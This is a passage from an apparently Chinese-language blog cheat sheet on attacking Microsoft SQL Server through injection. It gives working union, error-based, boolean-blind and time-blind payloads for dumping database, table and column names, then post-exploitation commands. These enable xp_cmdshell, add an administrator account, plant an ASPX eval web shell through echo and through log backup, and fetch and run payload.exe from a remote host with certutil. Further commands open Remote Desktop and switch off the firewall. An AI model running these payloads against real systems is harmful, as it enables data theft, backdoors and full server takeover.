<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 当前库的第一个表</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 table_name,1 FROM information_schema.tables </span><br><span class="line"></span><br><span class="line">-- 利用 !&#x3D; 依次判断当前库中的表</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 table_name,1 FROM information_schema.tables where table_name !&#x3D;&#39;Pilots&#39; and table_name !&#x3D; &#39;Planes&#39; and table_name !&#x3D; &#39;Flights&#39; and table_name !&#x3D; &#39;Pilots_on_flights&#39; and table_name !&#x3D; &#39;t&#39;     </span><br><span class="line"></span><br><span class="line">-- 用户</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT 1,name FROM master..sysobjects WHERE xtype&#x3D;&#39;U&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 当前库的第一个表的第一个字段名</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 column_name,1 FROM information_schema.columns</span><br><span class="line"></span><br><span class="line">-- 依次查询当前查询所使用的表的字段名</span><br><span class="line"></span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 column_name,1 FROM information_schema.columns where column_name !&#x3D; &#39;Birth_date&#39;</span><br><span class="line"></span><br><span class="line">--(如果需要指定表名：where table_name&#x3D;&#39;xx&#39;或者 where table_name&#x3D;十六进制表名)</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT TOP 1 column_name,1 FROM information_schema.columns where table_name &#x3D; &#39;Pilots&#39; and column_name !&#x3D; &#39;ID&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>字段内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 查询指定表中指定字段内容</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT 1,ProductID from t</span><br><span class="line"></span><br><span class="line">-- 依次查询。。</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union SELECT 1,ProductID from t where ProductID !&#x3D; 68</span><br></pre></td></tr></table></figure>

<h3 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h3><p><code>convert()</code>函数,<code>CONVERT()</code>函数是把⽇期转换为新数据类型的通⽤函数。除此之外还有：<code>file_name()</code>, <code>db_name()</code>,<code>col_name()</code>,<code>filegroup_name()</code>,<code>object_name()</code>,<code>schema_name()</code>,<code>type_name()</code>,<code>cast()</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">注释 ：</span><br><span class="line">data_type(length) 转换为⽬标数据类型（带有可选的长度）。</span><br><span class="line">data_to_be_converted 含有需要转换的值。</span><br><span class="line">style 规定⽇期&#x2F;时间的输出格式。</span><br><span class="line"></span><br><span class="line">convert(@@version)</span><br><span class="line">db_name(@@version)</span><br><span class="line">file_name(@@version)</span><br><span class="line">col_name(1,@@version)</span><br><span class="line">filegroup_name(@@version)</span><br><span class="line">object_name(@@version)</span><br><span class="line">schema_name(@@version)</span><br><span class="line">type_name(@@version)</span><br><span class="line">cast(@@version as int)   -- CAST (expression AS data_type)  表达式 as 数据类型</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONVERT(VARCHAR(19),GETDATE())</span><br><span class="line">CONVERT(VARCHAR(10),GETDATE(),110) </span><br><span class="line">CONVERT(VARCHAR(11),GETDATE(),106)</span><br><span class="line">CONVERT(VARCHAR(24),GETDATE(),113)</span><br><span class="line"></span><br><span class="line">Dec 29 2008 11:45 PM</span><br><span class="line">12-29-2008</span><br><span class="line">29 Dec 08</span><br><span class="line">29 Dec 2008 16:25:46.635</span><br></pre></td></tr></table></figure>

<p><strong>原理</strong></p>
<p>对于 <code>convert(int,@@version)</code>，<code>convert</code> 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为<code>int</code>类型。但是，由于这个SQL查询的结果是<code>varchar</code>类型，⽆法进⾏指定的转换，所以，<code>convert</code>函数会抛出 ⼀个<code>SQL server</code>错误消息，指出“SQL查询结果”⽆法转换为<code>“int”</code>类型，这样的话，攻击者就能得到的这个SQL查询的结果了。</p>
<p>具体示例参考：(前提是有错误信息返回)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union Select convert(int,@@version)</span><br></pre></td></tr></table></figure>

<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>该示例使用在线环境测试：<span class="exturl" data-url="aHR0cDovL3NxbGZpZGRsZS5jb20vIyExOC9mZjZiOC8xMzU5MQ==">http://sqlfiddle.com/#!18/ff6b8/13591<i class="fa fa-external-link-alt"></i></span></p>
<p>(本小节中语句均为自己构造。) 页面中选中SQL Server 2017 ，点击 view sample fiddle会有默认的语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE ForgeRock</span><br><span class="line">    ([productName] varchar(13), [description] varchar(57))</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">INSERT INTO ForgeRock</span><br><span class="line">    ([productName], [description])</span><br><span class="line">VALUES</span><br><span class="line">    (&#39;OpenIDM&#39;, &#39;Platform for building enterprise provisioning solutions&#39;),</span><br><span class="line">    (&#39;OpenAM&#39;, &#39;Full-featured access management&#39;),</span><br><span class="line">    (&#39;OpenDJ&#39;, &#39;Robust LDAP server for Java&#39;)</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h3 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h3><p>页面只有两个状态，返回正常，返回错误。也即是只有正确与否。</p>
<p>盲注所用主要函数为：<code>len(str)</code>判断长度，<code>substring(str,start,end)</code>截取字符串，<code>ascii(char)</code>判断字符串的ASCII值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len(str) 判断字符串的长度</span><br><span class="line">substring(str,start,len) 截取字符串的作用，第一个参数为要截取的字符串，第二个参数为从哪里开始截取，第三个参数为截取的长度</span><br><span class="line">ascii(char) 把字符转换为ascii值</span><br></pre></td></tr></table></figure>

<p><strong>数据库名判断</strong></p>
<p>根据，使用<code>len()</code>来猜数据库名的长度查询：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 无回显下语句执行成功</span><br><span class="line">select count(*) from master.dbo.sysdatabases where dbid&#x3D;1 and len(name)&#x3D;6</span><br></pre></td></tr></table></figure>

<ul>
<li>猜数据库名称的长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 当前库名</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and  len(db_name())&#x3D;11</span><br><span class="line"></span><br><span class="line">-- 根据dbid依次查询数据库名 (这里是dbid&#x3D;1是master)</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 1&#x3D;(select count(*) from master.dbo.sysdatabases where dbid&#x3D;1 and len(name)&#x3D;6)</span><br></pre></td></tr></table></figure>

<ul>
<li>逐字符判断数据库名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 当前库的名(截取字符串第一个字符)</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and ascii(substring(db_name(),1,1))&#x3D;100</span><br><span class="line"></span><br><span class="line">-- 根据dbid依次查询数据库名(这里是dbid&#x3D;1是master)</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 109&#x3D;ascii(substring((select name from master.dbo.sysdatabases where dbid&#x3D;1),1,1))</span><br></pre></td></tr></table></figure>

<p><strong>表名判断</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 指定数据库db_18_8acef查询表</span><br><span class="line">select name from db_18_8acef.dbo.sysobjects</span><br></pre></td></tr></table></figure>

<ul>
<li>判断表名的长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 判断当前表的长度</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 9&#x3D;len((select name from db_18_8acef.dbo.sysobjects where name in (select name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)))</span><br><span class="line"> </span><br><span class="line"> -- 这种方式也是一样的。</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and (select count(*) from db_18_8acef.dbo.sysobjects where name in (select top 1 name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and len(name)&#x3D;9)&#x3D;1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> -- 第二个表名 </span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 9&#x3D;len((select name from db_18_8acef.dbo.sysobjects where name in (select name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39; and name !&#x3D; &#39;ForgeRock&#39;)))</span><br><span class="line"> -- name !&#x3D; &#39;xx&#39; 可以换成 name not in (&#39;xx&#39;)</span><br></pre></td></tr></table></figure>

<ul>
<li>逐字符判断表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 截取表名字符串第一个字符</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 70&#x3D;ascii(substring((select name from db_18_8acef.dbo.sysobjects where name in (select name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)),1,1))</span><br><span class="line"></span><br><span class="line">-- 这种方式也是一样的。</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and (select count(*) from db_18_8acef.dbo.sysobjects where name in (select top 1 name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and ascii(substring(name,1,1))&#x3D;70)&#x3D;1</span><br></pre></td></tr></table></figure>

<p><strong>字段名</strong></p>
<ul>
<li>字段名长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 查询当前库，当前使用表的字段名</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 11&#x3D;len((SELECT  top 1 column_name FROM information_schema.columns where column_name !&#x3D; &#39;description&#39;))</span><br><span class="line"> </span><br><span class="line">-- 查询指定表的字段</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and  11&#x3D;len((SELECT TOP 1 column_name FROM information_schema.columns where table_name &#x3D; &#39;ForgeRock&#39; and column_name !&#x3D; &#39;productName&#39;))</span><br><span class="line"></span><br><span class="line">-- 这种方式也是一样的。知道了库名，表名，则可以利用syscolumns,sysobjects进行查询。。。如果存在多个同名表则可以使用 !&#x3D; 来限定</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and exists(select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and name not in (&#39;description&#39;) and len(name)&#x3D;11)</span><br></pre></td></tr></table></figure>

<ul>
<li>逐字符判断字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 查询当前库，当前使用表的字段名</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and ascii(substring((SELECT  top 1 column_name FROM information_schema.columns where column_name !&#x3D; &#39;description&#39;),1,1))&#x3D;112</span><br><span class="line"> </span><br><span class="line">-- 查询指定表的字段</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and  112&#x3D;ascii(substring((SELECT TOP 1 column_name FROM information_schema.columns where table_name &#x3D; &#39;ForgeRock&#39; and column_name !&#x3D; &#39;description&#39;),1,1))</span><br><span class="line"></span><br><span class="line">-- 这种方式也是一样的。</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and exists(select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and name not in (&#39;description&#39;) and unicode(substring(name,1,1))&#x3D;112)</span><br></pre></td></tr></table></figure>

<p><strong>字段内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and ascii(substring((select top 1 productName from ForgeRock),1,1))&#x3D;79</span><br></pre></td></tr></table></figure>

<h3 id="时间延时盲注"><a href="#时间延时盲注" class="headerlink" title="时间延时盲注"></a>时间延时盲注</h3><p>主要函数：<code>WAITFOR</code>,<code>IF exists()</code></p>
<p><code>WAITFOR</code>是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数<code>DELAY</code>，⽤来指定等待的时间。</p>
<p>如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有<code>延迟</code>，渗透测试⼈员就可以判断⽹站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WAITFOR DELAY &#39;0:0:n&#39; -- 语法</span><br><span class="line">WAITFOR DELAY &#39;0:0:4&#39; -- 延时4S</span><br><span class="line"></span><br><span class="line">-- 示例</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; WAITFOR DELAY &#39;0:0:2&#39;</span><br></pre></td></tr></table></figure>

<p><strong>数据库名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 判断数据库是否存在 dbid</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;1)&#x3D;1) waitfor delay &#39;0:0:1&#39;--</span><br></pre></td></tr></table></figure>

<ul>
<li>数据库名长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 根据dbid依次判断所有数据库名长度</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;1 and len(name)&#x3D;6)&#x3D;1) waitfor delay &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 当前数据库名长度</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select db_name()))&#x3D;11) waitfor delay &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<ul>
<li>逐字符字符判断</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 当前库</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(ascii(substring((select db_name()),1,1))&#x3D;100) waitfor delay &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 指定数据 逐字符判断</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (ascii(substring((Select Name FROM Master..SysDatabases where dbid&#x3D;8),1,1)) &#x3D; 100) WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<p><strong>数据库中表名</strong></p>
<ul>
<li>表名长度(!= 判断其他表名)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 当前库的表</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (len((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)))&#x3D;9) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 依次判断其他的表。 !&#x3D;</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (len((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and name !&#x3D;&#39;xx&#39;))&#x3D;9) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 一样的</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and len(name)&#x3D;9)&#x3D;1) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>逐字符猜表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 逐字符判断表名</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (ascii(substring((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)),1,1))&#x3D;70) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 依次判断其他的表。 !&#x3D;</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (ascii(substring((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and name !&#x3D;&#39;xxxx&#39;),1,1))&#x3D;70) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 一样的</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and ascii(substring(name,1,1))&#x3D;70)&#x3D;1) WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<p><strong>字段名</strong></p>
<ul>
<li>字段名长度(!= 判断其他字段名)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 判断第一个字段的长度</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;)))&#x3D;11) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 一样的</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(exists(select count(*) from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and len(name)&#x3D;11))  WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<ul>
<li>逐字符判断字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 判断第一个字段的字符</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;)))&#x3D;11) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 一样的</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(exists(select count(*) from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and ascii(substring(name,1,1))&#x3D;79))  WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<p><strong>字段内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--长度</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select top 1 productName from ForgeRock))&#x3D;7) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- 内容</span><br><span class="line"></span><br><span class="line">-- 对，最后的给省略了。。。  ~.~</span><br></pre></td></tr></table></figure>

<h2 id="调用系统命令"><a href="#调用系统命令" class="headerlink" title="调用系统命令"></a>调用系统命令</h2><h3 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h3><p>xp_cmdshell是Sql Server中的一个组件，可以用来执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>

<h3 id="无回显判断命令成功与否"><a href="#无回显判断命令成功与否" class="headerlink" title="无回显判断命令成功与否"></a>无回显判断命令成功与否</h3><p>DNSLog,ceye…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;ping -n 10 xxx.com&quot; --</span><br></pre></td></tr></table></figure>

<h3 id="DBA权限新建用户"><a href="#DBA权限新建用户" class="headerlink" title="DBA权限新建用户"></a>DBA权限新建用户</h3><p>变量是在批处理或过程的主体中用 DECLARE 语句声明的，并用 SET 或 SELECT 语句赋值。 游标变量可使用此语句声明，并可用于其他与游标相关的语句。 除非在声明中提供值，否则声明之后所有变量将初始化为 NULL。</p>
<p><code>DECLARE @local_variable</code>: <code>@local_variable</code>变量的名称。 变量名必须以 at 符 (@) 开头。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5&#39;;DECLARE @genp VARCHAR(8000);SET @genp&#x3D;0x6e657420757365722061646d696e746573742061646d696e202f616464;EXEC master..xp_cmdshell @genp--</span><br></pre></td></tr></table></figure>

<ul>
<li><code>5&#39;;EXEC master..xp_cmdshell &#39;net user an cc.123456 /add&#39;--</code></li>
<li><code>1&#39;;EXEC master..xp_cmdshell &#39;net user an cc.12341 /add&amp;&amp;net localgroup administrators an /add&#39;--</code></li>
</ul>
<h3 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h3><p>前提是知道，，，对对对，就是它，，，绝对路径嘛。。。 其实就是调用了系统命令<code>echo</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;echo ccc&gt;c:\Inetpub\mssql-sql\1.txt&quot; --</span><br></pre></td></tr></table></figure>

<ul>
<li>一句话</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cc&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#39;echo ^&lt;^%^@Page Language&#x3D;^&quot;^Jscript^&quot;^%^&gt;^&lt;^%^eval(Request.Item^[^&quot;cc^&quot;^]^,^&quot;unsafe^&quot;)^;^%^&gt;&gt;c:\Inetpub\mssql-sql\1.aspx&#39;--</span><br><span class="line"># 注意！如果echo 里面的字符有引号和其他符号，那么我们就要在引号前面加一个 ^ 来转义它！记得用单引号包裹里面的一句话！</span><br></pre></td></tr></table></figure>

<h3 id="Payload执行"><a href="#Payload执行" class="headerlink" title="Payload执行"></a>Payload执行</h3><p>原理就是调用了<code>certutil</code>进行下载。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.90.128:9000&#x2F;payload.exe payload.exe&quot; --</span><br></pre></td></tr></table></figure>

<h3 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h3><ul>
<li>是否开启远程桌面，返回1表示关闭，0表示开启</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39; ,&#39;fDenyTSConnections&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>读取远程桌面端口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#39;,&#39;PortNumber&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>开启远程桌面 (方法一)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;</span><br><span class="line"></span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>

<ul>
<li>开启远程桌面(方法二)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注册表reg文件开启远程</span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server]&quot;fDenyTSConnections&quot;&#x3D;dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\WinStations\RDP-Tcp]&quot;PortNumber&quot;&#x3D;dword:00000d3d</span><br><span class="line"></span><br><span class="line">保存c.reg，并执行regedit &#x2F;s c.reg</span><br></pre></td></tr></table></figure>

<p>如果第一次开启远程桌面，需要配置防火墙规则允许远程端口：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Remote Desktop&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow  <span class="comment"># 防火墙允许3389</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment"># 关闭防火墙</span></span><br></pre></td></tr></table></figure>

<ul>
<li>关闭远程桌面</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,1;</span><br></pre></td></tr></table></figure>

<h3 id="日志备份获Shell"><a href="#日志备份获Shell" class="headerlink" title="日志备份获Shell"></a>日志备份获Shell</h3><p>参考：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVW9oZ0NDenYzYVZQUTJjT0dCZ29LUQ==">https://mp.weixin.qq.com/s/UohgCCzv3aVPQ2cOGBgoKQ<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>低权限情况下。</p>
<p><code>LOG备份</code>的要求是他的<code>数据库备份过</code>，而且选择恢复模式<code>得是完整模式</code>，至少在<code>2008</code>上是这样的，但是使用log备份<code>文件会小的多</code>，当然如果你的权限够高可以设置他的恢复模式。</p>
<ul>
<li>修改数据库恢复为完整模式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; ;alter database test set RECOVERY FULL -- </span><br></pre></td></tr></table></figure>

<ul>
<li>创建一张表：cmd，只有一个 a 列，类型为 image</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table cmd (a image) --</span><br></pre></td></tr></table></figure>

<ul>
<li>备份表到C:\1.bak</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup log test to disk &#x3D; &#39;c:&#x2F;1.bak&#39; with init --</span><br></pre></td></tr></table></figure>

<ul>
<li>插入一句话木马到 cmd 表里</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into cmd (a) values (&#39;&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cc&quot;],&quot;unsafe&quot;);%&gt;&#39;)--</span><br></pre></td></tr></table></figure>

<ul>
<li>把操作日志备份到网站根目录</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup log test to disk &#x3D; &#39;c:\inetpub\wwwroot\saul.aspx&#39; --</span><br></pre></td></tr></table></figure>

<ul>
<li>把创建的表删了</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop table cmd--</span><br></pre></td></tr></table></figure>

<h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h3><p>参考：</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVW9oZ0NDenYzYVZQUTJjT0dCZ29LUQ==">https://mp.weixin.qq.com/s/UohgCCzv3aVPQ2cOGBgoKQ<i class="fa fa-external-link-alt"></i></span></p>
</li>
